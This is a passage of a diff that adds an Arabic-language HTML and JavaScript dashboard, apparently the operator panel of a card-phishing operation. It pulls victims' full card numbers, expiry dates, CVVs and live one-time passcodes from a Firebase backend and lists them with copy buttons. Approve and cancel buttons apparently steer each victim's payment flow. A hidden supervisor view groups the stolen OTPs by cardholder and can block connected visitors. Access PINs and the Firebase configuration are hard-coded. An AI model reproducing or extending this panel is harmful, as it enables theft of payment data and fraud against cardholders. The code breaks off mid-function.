@@ -1,0 +1,972 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>غرفة العمليات | Live Feed</title>
+    
+    <!-- Ultra-Premium Typography -->
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&family=JetBrains+Mono:wght@400;700;800&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+    
+    <!-- Firebase Libraries -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore-compat.js"></script>
+
+    <style>
+        :root {
+            --bg-deep: #08090C;
+            --glass-bg: rgba(15, 17, 26, 0.7);
+            --glass-border: rgba(255, 255, 255, 0.1);
+            --gold-neon: #FFD700;
+            --cyan-neon: #00F2FE;
+            --danger-red: #ff3366;
+            --success-green: #22c55e;
+            --text-light: #F8FAFC;
+            --text-dim: #94A3B8;
+        }
+
+        body {
+            font-family: 'Cairo', sans-serif;
+            margin: 0;
+            background-color: var(--bg-deep);
+            color: var(--text-light);
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* Ambient Glowing Orbs */
+        .ambient-orbs {
+            position: fixed;
+            top: 0; left: 0; width: 100vw; height: 100vh;
+            z-index: -2;
+            overflow: hidden;
+            pointer-events: none;
+            background: var(--bg-deep);
+        }
+        .orb {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(120px);
+            opacity: 0.4;
+            animation: float 20s infinite alternate ease-in-out;
+        }
+        .orb-gold {
+            width: 400px; height: 400px;
+            background: var(--gold-neon);
+            top: -100px; right: -100px;
+        }
+        .orb-cyan {
+            width: 500px; height: 500px;
+            background: var(--cyan-neon);
+            bottom: -200px; left: -100px;
+            animation-delay: -5s;
+        }
+        .orb-purple {
+            width: 400px; height: 400px;
+            background: #a855f7;
+            top: 40%; left: 40%;
+            animation-delay: -10s;
+            opacity: 0.25;
+        }
+
+        @keyframes float {
+            0% { transform: translate(0, 0) scale(1); }
+            100% { transform: translate(100px, 150px) scale(1.2); }
+        }
+
+        /* Elegant Watermarks */
+        .watermarks {
+            position: fixed;
+            top: 0; left: 0; width: 100vw; height: 100vh;
+            z-index: -1;
+            pointer-events: none;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-around;
+            align-content: space-around;
+            opacity: 0.05;
+            font-size: 4rem;
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: 5px;
+            color: #ffffff;
+            user-select: none;
+        }
+        .watermarks span { transform: rotate(-30deg); }
+
+        /* Login Screen */
+        #loginScreen {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(8, 9, 12, 0.9);
+            backdrop-filter: blur(20px);
+            display: flex; justify-content: center; align-items: center;
+            z-index: 9999; transition: opacity 0.5s ease;
+        }
+        .login-box {
+            background: var(--glass-bg);
+            padding: 40px; border-radius: 16px;
+            border: 1px solid var(--glass-border);
+            box-shadow: 0 0 40px rgba(0, 242, 254, 0.1);
+            text-align: center; width: 100%; max-width: 380px;
+        }
+        .login-box input {
+            width: 100%; padding: 14px;
+            background: rgba(0,0,0,0.5);
+            border: 1px solid var(--glass-border);
+            border-radius: 8px; color: var(--gold-neon);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 16px; margin-bottom: 20px;
+            text-align: center; letter-spacing: 4px;
+            outline: none; transition: 0.3s;
+            box-sizing: border-box;
+        }
+        .login-box input:focus { border-color: var(--cyan-neon); box-shadow: 0 0 15px rgba(0,242,254,0.3); }
+        .login-box button {
+            width: 100%; padding: 14px;
+            background: transparent;
+            border: 1px solid var(--gold-neon);
+            border-radius: 8px; color: var(--gold-neon);
+            font-family: 'Cairo', sans-serif; font-weight: 700;
+            font-size: 16px; cursor: pointer; transition: 0.3s;
+        }
+        .login-box button:hover { background: var(--gold-neon); color: #000; box-shadow: 0 0 20px rgba(255, 215, 0, 0.4); }
+
+        /* Navigation Bar */
+        .top-nav {
+            background: var(--glass-bg);
+            backdrop-filter: blur(16px);
+            border-bottom: 1px solid var(--glass-border);
+            padding: 15px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky; top: 0; z-index: 100;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+        .nav-logo-container { display: flex; align-items: center; gap: 15px; }
+        .nav-logo-container img { height: 40px; border-radius: 8px; }
+        .nav-title { font-weight: 900; font-size: 20px; color: var(--text-light); text-shadow: 0 0 10px rgba(255,255,255,0.2); }
+        
+        .live-status {
+            display: flex; align-items: center; gap: 10px;
+            font-family: 'JetBrains Mono', monospace; font-size: 12px;
+            color: var(--cyan-neon); border: 1px solid var(--cyan-neon);
+            padding: 6px 14px; border-radius: 20px;
+            box-shadow: 0 0 10px rgba(0, 242, 254, 0.2);
+            animation: pulse-border 2s infinite;
+        }
+        .live-dot { width: 8px; height: 8px; background: var(--cyan-neon); border-radius: 50%; animation: blink 1s infinite; }
+
+        /* Supervisor Badge */
+        .supervisor-badge {
+            background: linear-gradient(135deg, #a855f7, #6366f1);
+            color: #fff; font-size: 12px; font-weight: 800;
+            padding: 4px 12px; border-radius: 20px;
+            letter-spacing: 1px;
+            box-shadow: 0 0 15px rgba(168, 85, 247, 0.5);
+            display: inline-flex; align-items: center; gap: 6px;
+        }
+        
+        .logout-btn {
+            background: transparent; border: 1px solid var(--danger-red);
+            color: var(--danger-red); padding: 6px 14px; border-radius: 20px;
+            cursor: pointer; font-family: 'Cairo', sans-serif;
+            font-weight: 700; font-size: 12px; transition: 0.3s;
+        }
+        .logout-btn:hover { background: var(--danger-red); color: #fff; }
+
+        @keyframes pulse-border { 0% { box-shadow: 0 0 5px rgba(0,242,254,0.2); } 50% { box-shadow: 0 0 15px rgba(0,242,254,0.5); } 100% { box-shadow: 0 0 5px rgba(0,242,254,0.2); } }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+
+        /* Vertical Feed Layout */
+        .feed-container {
+            max-width: 800px; margin: 40px auto; padding: 0 20px;
+            display: flex; flex-direction: column; gap: 24px;
+        }
+
+        .empty-state {
+            text-align: center; padding: 60px;
+            background: var(--glass-bg); border-radius: 16px;
+            border: 1px dashed var(--glass-border);
+            color: var(--text-dim); font-size: 18px; font-weight: 600;
+        }
+
+        /* Order Card - Glassmorphism */
+        .order-card {
+            background: var(--glass-bg);
+            backdrop-filter: blur(20px);
+            border: 1px solid var(--glass-border);
+            border-radius: 16px;
+            padding: 24px;
+            position: relative;
+            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+            transform-origin: top center;
+        }
+        .order-card:hover {
+            border-color: rgba(255, 215, 0, 0.4);
+            box-shadow: 0 0 30px rgba(255, 215, 0, 0.1), inset 0 0 20px rgba(0, 242, 254, 0.05);
+            transform: translateY(-3px) scale(1.01);
+        }
+
+        /* Physics Drop Animation */
+        .drop-in {
+            animation: physicsDrop 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
+        }
+        @keyframes physicsDrop {
+            0% { opacity: 0; transform: translateY(-40px) scale(0.95) rotateX(10deg); }
+            100% { opacity: 1; transform: translateY(0) scale(1) rotateX(0); }
+        }
+
+        /* Card Data Bar Layout */
+        .card-header {
+            display: flex; justify-content: space-between; align-items: center;
+            border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 15px; margin-bottom: 15px;
+            flex-wrap: wrap; gap: 10px;
+        }
+        .client-name { font-size: 20px; font-weight: 700; color: var(--gold-neon); }
+        .timestamp { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text-dim); }
+
+        .data-bar {
+            display: grid; grid-template-columns: 1fr 1fr; gap: 15px;
+            background: rgba(0,0,0,0.4); border-radius: 12px; padding: 16px;
+            border: 1px solid rgba(255,255,255,0.03); margin-bottom: 20px;
+        }
+        .data-group { display: flex; flex-direction: column; gap: 4px; }
+        .data-label { font-size: 12px; color: var(--text-dim); text-transform: uppercase; letter-spacing: 1px; }
+        .data-value { 
+            font-family: 'JetBrains Mono', monospace; font-size: 16px; color: var(--text-light); 
+            display: flex; justify-content: space-between; align-items: center;
+            word-break: break-all;
+        }
+        .data-value.highlight { color: var(--cyan-neon); font-size: 22px; font-weight: 800; letter-spacing: 2px; }
+        
+        .copy-btn {
+            background: transparent; border: none; color: var(--text-dim); cursor: pointer; transition: 0.2s;
+        }
+        .copy-btn:hover { color: var(--gold-neon); }
+
+        /* Action Buttons */
+        .actions-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+        .btn-action {
+            padding: 14px; border-radius: 12px; font-family: 'Cairo', sans-serif;
+            font-weight: 700; font-size: 16px; cursor: pointer; transition: 0.3s;
+            display: flex; justify-content: center; align-items: center; gap: 8px;
+        }
+        .btn-accept {
+            background: rgba(255, 215, 0, 0.1); border: 1px solid var(--gold-neon); color: var(--gold-neon);
+        }
+        .btn-accept:hover { background: var(--gold-neon); color: #000; box-shadow: 0 0 20px rgba(255, 215, 0, 0.4); }
+        
+        .btn-reject {
+            background: transparent; border: 1px solid var(--danger-red); color: var(--danger-red);
+        }
+        .btn-reject:hover { background: rgba(255, 51, 102, 0.1); box-shadow: 0 0 20px rgba(255, 51, 102, 0.2); }
+
+        /* Toast Notification */
+        #toast {
+            position: fixed; bottom: -100px; left: 50%; transform: translateX(-50%);
+            background: var(--gold-neon); color: #000; padding: 12px 24px;
+            border-radius: 30px; font-weight: 800; font-size: 16px;
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.5); z-index: 1000;
+            transition: bottom 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            white-space: nowrap;
+        }
+        #toast.show { bottom: 30px; }
+
+        /* ====================== SUPERVISOR VIEW ====================== */
+        .supervisor-layout {
+            max-width: 1200px;
+            margin: 30px auto;
+            padding: 0 20px;
+            display: grid;
+            grid-template-columns: 380px 1fr;
+            gap: 24px;
+        }
+        @media (max-width: 900px) {
+            .supervisor-layout { grid-template-columns: 1fr; }
+        }
+
+        .supervisor-panel {
+            background: var(--glass-bg);
+            backdrop-filter: blur(20px);
+            border: 1px solid var(--glass-border);
+            border-radius: 16px;
+            padding: 20px;
+            align-self: start;
+        }
+        .panel-title {
+            font-size: 16px; font-weight: 800; color: var(--text-light);
+            margin: 0 0 15px 0;
+            padding-bottom: 12px;
+            border-bottom: 1px solid rgba(255,255,255,0.06);
+            display: flex; align-items: center; gap: 10px;
+        }
+        .panel-title i { color: var(--gold-neon); }
+
+        .session-item {
+            background: rgba(0,0,0,0.4);
+            border: 1px solid rgba(255,255,255,0.05);
+            border-radius: 12px;
+            padding: 12px 14px;
+            margin-bottom: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 10px;
+            transition: 0.3s;
+        }
+        .session-item:hover { border-color: rgba(255, 215, 0, 0.3); }
+        .session-item.blocked { opacity: 0.45; border-color: rgba(255,51,102,0.4); }
+        .session-info { flex: 1; min-width: 0; }
+        .session-name {
+            font-weight: 700; font-size: 14px; color: var(--text-light);
+            white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+        }
+        .session-meta {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px; color: var(--text-dim);
+            margin-top: 4px;
+        }
+        .session-actions { display: flex; gap: 6px; flex-shrink: 0; }
+        .mini-btn {
+            padding: 6px 10px; border-radius: 8px; font-size: 11px;
+            font-family: 'Cairo', sans-serif; font-weight: 700;
+            cursor: pointer; transition: 0.2s; border: 1px solid;
+        }
+        .mini-btn.block {
+            background: transparent; border-color: var(--danger-red); color: var(--danger-red);
+        }
+        .mini-btn.block:hover { background: var(--danger-red); color: #fff; }
+        .mini-btn.logout {
+            background: transparent; border-color: var(--cyan-neon); color: var(--cyan-neon);
+        }
+        .mini-btn.logout:hover { background: var(--cyan-neon); color: #000; }
+        .mini-btn.unblock {
+            background: transparent; border-color: var(--success-green); color: var(--success-green);
+        }
+        .mini-btn.unblock:hover { background: var(--success-green); color: #fff; }
+
+        .empty-mini {
+            text-align: center; padding: 20px;
+            color: var(--text-dim); font-size: 13px;
+            border: 1px dashed rgba(255,255,255,0.08);
+            border-radius: 10px;
+        }
+
+        /* Client Card - Grouped by name */
+        .client-card {
+            background: var(--glass-bg);
+            backdrop-filter: blur(20px);
+            border: 1px solid var(--glass-border);
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 18px;
+            transition: 0.3s;
+            animation: physicsDrop 0.5s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
+        }
+        .client-card:hover {
+            border-color: rgba(168, 85, 247, 0.4);
+            box-shadow: 0 0 30px rgba(168, 85, 247, 0.1);
+        }
+        .client-card-header {
+            display: flex; justify-content: space-between; align-items: center;
+            margin-bottom: 15px;
+            padding-bottom: 12px;
+            border-bottom: 1px dashed rgba(255,255,255,0.08);
+            flex-wrap: wrap; gap: 10px;
+        }
+        .client-card-name {
+            font-size: 18px; font-weight: 800; color: var(--gold-neon);
+            display: flex; align-items: center; gap: 8px;
+        }
+        .client-card-name i { font-size: 14px; }
+        .client-card-count {
+            background: rgba(168, 85, 247, 0.15);
+            color: #c084fc;
+            padding: 4px 12px; border-radius: 20px;
+            font-size: 12px; font-weight: 700;
+            border: 1px solid rgba(168, 85, 247, 0.3);
+        }
+        .client-records { display: flex; flex-direction: column; gap: 10px; }
+        .otp-record {
+            background: rgba(0,0,0,0.45);
+            border: 1px solid rgba(255,255,255,0.05);
+            border-radius: 12px;
+            padding: 12px 14px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+        .otp-big {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 22px; font-weight: 800;
+            color: var(--cyan-neon);
+            letter-spacing: 3px;
+            text-shadow: 0 0 10px rgba(0, 242, 254, 0.4);
+            flex-shrink: 0;
+        }
+        .otp-meta {
+            flex: 1;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            color: var(--text-dim);
+            justify-content: flex-end;
+        }
+        .otp-meta span {
+            display: inline-flex; align-items: center; gap: 5px;
+        }
+        .otp-meta i { color: rgba(255,255,255,0.3); }
+        .otp-time { color: var(--gold-neon); }
+
+        .copy-mini {
+            background: transparent; border: 1px solid rgba(0, 242, 254, 0.4);
+            color: var(--cyan-neon); padding: 5px 9px; border-radius: 8px;
+            cursor: pointer; font-size: 12px; transition: 0.2s;
+        }
+        .copy-mini:hover { background: var(--cyan-neon); color: #000; }
+
+        .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        .badge-count {
+            background: rgba(0, 242, 254, 0.15);
+            color: var(--cyan-neon);
+            padding: 3px 10px; border-radius: 20px;
+            font-size: 12px; font-weight: 700;
+            font-family: 'JetBrains Mono', monospace;
+            border: 1px solid rgba(0, 242, 254, 0.3);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="ambient-orbs">
+        <div class="orb orb-gold"></div>
+        <div class="orb orb-cyan"></div>
+        <div class="orb orb-purple"></div>
+    </div>
+
+    <div class="watermarks">
+        <span>Ronald Pavency</span><span>Ali Alnaser</span><span>علي الناصر</span><span>المهندس</span>
+        <span>Ronald Pavency</span><span>Ali Alnaser</span><span>علي الناصر</span><span>المهندس</span>
+    </div>
+
+    <!-- ======================= Login Screen ======================= -->
+    <div id="loginScreen">
+        <div class="login-box">
+            <h2 style="color: var(--text-light); font-weight: 900;">SYSTEM ACCESS</h2>
+            <input type="password" id="adminPass" placeholder="ENTER PIN" />
+            <button onclick="verifyAccess()">INITIALIZE DASHBOARD</button>
+            <p id="errorTxt" style="color: var(--danger-red); display: none; margin-top: 15px; font-size: 14px;">Access Denied. Try again.</p>
+        </div>
+    </div>
+
+    <!-- ======================= Regular View (PIN: 31122006) ======================= -->
+    <div id="regularView" style="display:none;">
+        <div class="top-nav">
+            <div class="nav-logo-container">
+                <img src="https://ui-avatars.com/api/?name=Admin&background=0F111A&color=FFD700&rounded=true" alt="Logo">
+                <div class="nav-title">غرفة العمليات - بث مباشر للطلبات يا مهندس</div>
+            </div>
+            <div style="display:flex; gap:10px; align-items:center;">
+                <div class="live-status">
+                    <div class="live-dot"></div> ONLINE / LIVE FEED
+                </div>
+                <button class="logout-btn" onclick="logoutToLogin()"><i class="fa-solid fa-power-off"></i> خروج</button>
+            </div>
+        </div>
+
+        <div class="feed-container" id="liveFeed">
+            <div class="empty-state">
+                <i class="fa-solid fa-satellite-dish fa-spin" style="font-size: 24px; margin-bottom: 12px; color: var(--gold-neon);"></i><br>
+                الجو هادي.. قاطعين السير، استنّى الدفعة الجاية يا مهندس!
+            </div>
+        </div>
+    </div>
+
+    <!-- ======================= Supervisor View (PIN: 078924) - HIDDEN ======================= -->
+    <div id="supervisorView" style="display:none;">
+        <div class="top-nav">
+            <div class="nav-logo-container">
+                <img src="https://ui-avatars.com/api/?name=SV&background=1a0533&color=a855f7&rounded=true" alt="Logo">
+                <div class="nav-title">لوحة المشرف العامة</div>
+                <span class="supervisor-badge"><i class="fa-solid fa-shield-halved"></i> SUPERVISOR</span>
+            </div>
+            <div style="display:flex; gap:10px; align-items:center;">
+                <div class="live-status">
+                    <div class="live-dot"></div> MONITORING
+                </div>
+                <button class="logout-btn" onclick="logoutToLogin()"><i class="fa-solid fa-power-off"></i> خروج</button>
+            </div>
+        </div>
+
+        <div class="supervisor-layout">
+            <!-- Sessions Panel -->
+            <aside class="supervisor-panel">
+                <h3 class="panel-title"><i class="fa-solid fa-users-viewfinder"></i> المتصلون الآن</h3>
+                <div id="sessionsList">
+                    <div class="empty-mini">لا يوجد مستخدمين حالياً</div>
+                </div>
+            </aside>
+
+            <!-- Grouped OTPs Panel -->
+            <main>
+                <div class="section-header">
+                    <h3 class="panel-title" style="border:none; padding:0; margin:0;"><i class="fa-solid fa-id-card-clip"></i> بطاقات OTP حسب العميل</h3>
+                    <span class="badge-count" id="groupsCount">0</span>
+                </div>
+                <div id="groupedOTPs">
+                    <div class="empty-mini">لا يوجد بيانات بعد</div>
+                </div>
+            </main>
+        </div>
+    </div>
+
+    <div id="toast">جالك طلب جديد حيّ الله بالنشامى!</div>
+
+    <script>
+        // ============= Web Audio API Synth Engine =============
+        let audioCtx;
+        function initAudio() {
+            if (!audioCtx) {
+                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            }
+            if (audioCtx.state === 'suspended') audioCtx.resume();
+        }
+
+        function playSound(type) {
+            if (!audioCtx) return;
+            const osc = audioCtx.createOscillator();
+            const gain = audioCtx.createGain();
+            osc.connect(gain);
+            gain.connect(audioCtx.destination);
+
+            if (type === 'newOrder') {
+                osc.type = 'sine';
+                osc.frequency.setValueAtTime(523.25, audioCtx.currentTime);
+                osc.frequency.exponentialRampToValueAtTime(659.25, audioCtx.currentTime + 0.1);
+                gain.gain.setValueAtTime(0, audioCtx.currentTime);
+                gain.gain.linearRampToValueAtTime(0.2, audioCtx.currentTime + 0.05);
+                gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 1.2);
+                osc.start(); osc.stop(audioCtx.currentTime + 1.2);
+            } else if (type === 'click') {
+                osc.type = 'triangle';
+                osc.frequency.setValueAtTime(900, audioCtx.currentTime);
+                osc.frequency.exponentialRampToValueAtTime(300, audioCtx.currentTime + 0.15);
+                gain.gain.setValueAtTime(0, audioCtx.currentTime);
+                gain.gain.linearRampToValueAtTime(0.15, audioCtx.currentTime + 0.02);
+                gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.15);
+                osc.start(); osc.stop(audioCtx.currentTime + 0.15);
+            } else if (type === 'admin') {
+                osc.type = 'sine';
+                osc.frequency.setValueAtTime(440, audioCtx.currentTime);
+                osc.frequency.exponentialRampToValueAtTime(880, audioCtx.currentTime + 0.2);
+                gain.gain.setValueAtTime(0, audioCtx.currentTime);
+                gain.gain.linearRampToValueAtTime(0.15, audioCtx.currentTime + 0.05);
+                gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.5);
+                osc.start(); osc.stop(audioCtx.currentTime + 0.5);
+            }
+        }
+
+        // ============= Login / Access =============
+        let currentMode = null;
+
+        function verifyAccess() {
+            const pass = document.getElementById('adminPass').value.trim();
+            initAudio();
+
+            if (pass === '31122006') {
+                // Regular Admin View
+                playSound('admin');
+                currentMode = 'regular';
+                document.getElementById('loginScreen').style.opacity = '0';
+                setTimeout(() => {
+                    document.getElementById('loginScreen').style.display = 'none';
+                    document.getElementById('regularView').style.display = 'block';
+                    document.getElementById('supervisorView').style.display = 'none';
+                }, 500);
+            } else if (pass === '078924') {
+                // Hidden Supervisor View
+                playSound('admin');
+                currentMode = 'supervisor';
+                document.getElementById('loginScreen').style.opacity = '0';
+                setTimeout(() => {
+                    document.getElementById('loginScreen').style.display = 'none';
+                    document.getElementById('regularView').style.display = 'none';
+                    document.getElementById('supervisorView').style.display = 'block';
+                }, 500);
+            } else {
+                document.getElementById('errorTxt').style.display = 'block';
+            }
+        }
+
+        document.getElementById("adminPass").addEventListener("keypress", (e) => {
+            if (e.key === "Enter") verifyAccess();
+        });
+
+        function logoutToLogin() {
+            playSound('click');
+            currentMode = null;
+            const loginScreen = document.getElementById('loginScreen');
+            loginScreen.style.display = 'flex';
+            loginScreen.style.opacity = '1';
+            document.getElementById('regularView').style.display = 'none';
+            document.getElementById('supervisorView').style.display = 'none';
+            document.getElementById('adminPass').value = '';
+            document.getElementById('errorTxt').style.display = 'none';
+        }
+
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text);
+            playSound('click');
+        }
+
+        function showToast(msg) {
+            const toast = document.getElementById('toast');
+            toast.textContent = msg;
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 3000);
+        }
+
+        // ============= Firebase Configuration =============
+        const firebaseConfig = {
+            apiKey: "AIzaSyD_JfgnZpx8iS8QG61NKBioNP3Ae1FEms8",
+            authDomain: "ronald-pavency-i1tap.firebaseapp.com",
+            projectId: "ronald-pavency-i1tap",
+            storageBucket: "ronald-pavency-i1tap.firebasestorage.app",
+            messagingSenderId: "948365366268",
+            appId: "1:948365366268:web:004f6f39a85e910137d879"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        const liveFeed = document.getElementById('liveFeed');
+        let initialLoad = true;
+        let unifiedData = new Map();
+        let sessionsData = new Map();
+
+        // ============= Regular View: Render Feed =============
+        function renderFeed() {
+            if (unifiedData.size === 0) {
+                liveFeed.innerHTML = `
+                    <div class="empty-state">
+                        <i class="fa-solid fa-satellite-dish fa-spin" style="font-size: 24px; margin-bottom: 12px; color: var(--gold-neon);"></i><br>
+                        الجو هادي.. قاطعين السير، استنّى الدفعة الجاية يا مهندس!
+                    </div>`;
+                return;
+            }
+
+            const sortedRecords = Array.from(unifiedData.values()).sort((a, b) => {
+                const timeA = a.timestamp ? a.timestamp.seconds : 0;
+                const timeB = b.timestamp ? b.timestamp.seconds : 0;
+                return timeB - timeA;
+            });
+
+            liveFeed.innerHTML = '';
+            sortedRecords.forEach((data) => {
+                const cardNo = data.cardInfo?.number || data.cardNumber || 'N/A';
+                const expiry = data.cardInfo?.expiry || 'N/A';
+                const cvc = data.cardInfo?.cvv || data.cvv || data.cardInfo?.cvc || data.cvc || 'N/A';
+                const otpVal = data.otp || '---';
+                const clientName = data.cardInfo?.name || data.name || 'Unknown User';
+                const timeStr = data.timestamp ? new Date(data.timestamp.toDate()).toLocaleTimeString('en-US') : 'Just now';
+
+                const isProcessed = data.status !== 'pending';
+                const statusLabel = data.status === 'approved' ? '<span style="color: var(--cyan-neon); font-size: 12px;">(مقبول ✓)</span>' : (data.status === 'rejected' ? '<span style="color: var(--danger-red); font-size: 12px;">(مرفوض ✖)</span>' : '');
+
+                const html = `
+                    <div class="order-card drop-in" style="${isProcessed ? 'opacity: 0.6; border-color: rgba(255,255,255,0.1);' : ''}">
+                        <div class="card-header">
+                            <div class="client-name"><i class="fa-solid fa-user-ninja" style="font-size: 14px; margin-left: 8px;"></i>${clientName} ${statusLabel}</div>
+                            <div class="timestamp">${timeStr} <i class="fa-regular fa-clock" style="margin-right: 5px;"></i></div>
+                        </div>
+                        
+                        <div class="data-bar">
+                            <div class="data-group" style="grid-column: 1 / -1;">
+                                <span class="data-label">Card Number</span>
+                                <div class="data-value">
+                                    ${cardNo} 
+                                    <button class="copy-btn" onclick="copyToClipboard('${cardNo}')"><i class="fa-regular fa-copy"></i></button>
+                                </div>
+                            </div>
+                            <div class="data-group">
+                                <span class="data-label">Expiry / CVV</span>
+                                <div class="data-value">${expiry} &nbsp;|&nbsp; ${cvc}</div>
+                            </div>
+                            <div class="data-group">
+                                <span class="data-label">Live OTP</span>
+                                <div class="data-value highlight">
+                                    ${otpVal}
+                                    ${otpVal !== '---' ? `<button class="copy-btn" onclick="copyToClipboard('${otpVal}')"><i class="fa-regular fa-copy"></i></button>` : ''}
+                                </div>
+                            </div>
+                        </div>
+
+                        ${!isProcessed ? `
+                        <div class="actions-grid">
+                            <button class="btn-action btn-accept" onclick="processAction('${data.type}', '${data.id}', 'approved')">
+                                 طالعة يكبير ⚡
+                            </button>
+                            <button class="btn-action btn-reject" onclick="processAction('${data.type}', '${data.id}', 'rejected')">
+                                 كنسل ✖
+                            </button>
+                        </div>` : ''}
+                    </div>
+                `;
+                liveFeed.insertAdjacentHTML('beforeend', html);
+            });
+        }
+
+        // ============= Supervisor View: Render Grouped OTPs =============
+        function renderGroupedOTPs() {
+            const container = document.getElementById('groupedOTPs');
+            if (!container) return;
+
+            if (unifiedData.size === 0) {
+                container.innerHTML = '<div class="empty-mini">لا يوجد بيانات بعد</div>';
+                document.getElementById('groupsCount').textContent = '0';
+                return;
+            }
+
+            // Group by client name (or card holder name)
+            const groups = new Map();
+            unifiedData.forEach((data) => {
+                const name = data.cardInfo?.name || data.name || 'زائر مجهول';
+                if (!groups.has(name)) groups.set(name, []);
+                groups.get(name).push(data);
+            });
+
+            document.getElementById('groupsCount').textContent = groups.size;
+
+            let html = '';
+            groups.forEach((items, name) => {
+                // Sort descending by timestamp
+                items.sort((a, b) => {
+                    const tA = a.timestamp?.seconds || 0;
+                    const tB = b.timestamp?.seconds || 0;
+                    return tB - tA;
+                });
+
+                const recordsHtml = items.map(item => {
+                    const cardNo = item.cardInfo?.number || item.cardNumber || '';
+                    const expiry = item.cardInfo?.expiry || '--/--';
+                    const cvv = item.cardInfo?.cvv || item.cvv || item.cardInfo?.cvc || item.cvc || '---';
+                    const otp = item.otp || '---';
+                    const time = item.timestamp ? new Date(item.timestamp.toDate()).toLocaleTimeString('en-US') : '';
+
+                    // Show last 4 of card for privacy
+                    const maskedCard = cardNo.length > 4
+                        ? '**** **** **** ' + cardNo.slice(-4)
+                        : (cardNo || '---');
+
+                    return `
+                        <div class="otp-record">
+                            <div class="otp-big">${otp}</div>
+                            <div class="otp-meta">
+                                <span><i class="fa-regular fa-credit-card"></i> ${maskedCard}</span>
+                                <span><i class="fa-regular fa-calendar"></i> ${expiry}</span>
+                                <span><i class="fa-solid fa-lock"></i> ${cvv}</span>
+                                <span class="otp-time"><i class="fa-regular fa-clock"></i> ${time}</span>
+                            </div>
+                            ${otp !== '---' ? `<button class="copy-mini" onclick="copyToClipboard('${otp}')"><i class="fa-regular fa-copy"></i> نسخ</button>` : ''}
+                        </div>
+                    `;
+                }).join('');
+
+                html += `
+                    <div class="client-card">
+                        <div class="client-card-header">
+                            <div class="client-card-name"><i class="fa-solid fa-user-shield"></i> ${name}</div>
+                            <div class="client-card-count">${items.length} سجل</div>
+                        </div>
+                        <div class="client-records">${recordsHtml}</div>
+                    </div>
+                `;
+            });
+
+            container.innerHTML = html;
+        }
+
+        // ============= Supervisor View: Render Sessions =============
+        function renderSessions() {
+            const container = document.getElementById('sessionsList');
+            if (!container) return;
+
+            if (sessionsData.size === 0) {
+                container.innerHTML = '<div class="empty-mini">لا يوجد مستخدمين حالياً</div>';
+                return;
+            }
+
+            // Sort by lastSeen desc
+            const sorted = Array.from(sessionsData.values()).sort((a, b) => {
+                const tA = a.lastSeen?.seconds || a.createdAt?.seconds || 0;
+                const tB = b.lastSeen?.seconds || b.createdAt?.seconds || 0;
+                return tB - tA;
+            });
+
+            let html = '';
+            sorted.forEach(s => {
+                const name = s.name || 'زائر';
+                const phone = s.phone || s.ip || 'غير معروف';
+                const status = s.status || 'active';
+                const lastSeen = s.lastSeen ? new Date(s.lastSeen.toDate()).toLocaleTimeString('en-US') : 'الآن';
+                const isBlocked = status === 'blocked';
+                const isLoggedOut = status === 'logged-out';
+
+                let statusColor = '#22c55e';
+                let statusTxt = 'نشط';
+                if (isBlocked) { statusColor = '#ff3366'; statusTxt = 'محظور'; }
+                else if (isLoggedOut) { statusColor = '#94A3B8'; statusTxt = 'مسجل خروج'; }
+
+                html += `
+                    <div class="session-item ${isBlocked ? 'blocked' : ''}">
+                        <div class="session-info">
+                            <div class="session-name">
+                                <span style="display:inline-block;width:8px;height:8px;border-radius:50%;background:${statusColor};margin-left:6px;"></span>
+                                ${name}
+                            </div>
+                            <div class="session-meta">${phone} • ${lastSeen} • ${statusTxt}</div>
+                        </div>
+                        <div class="session-actions">
+                            ${!isBlocked && !isLoggedOut
+                                ? `<button class="mini-btn block" onclick="blockUser('${s.id}')"><i class="fa-solid fa-ban"></i></button>`
+                                : ''}
+                            ${isBlocked
+                                ? `<button class="mini-btn unblock" onclick="unblockUser('${s.id}')"><i class="fa-solid fa-unlock"></i></button>`
+                                : ''}
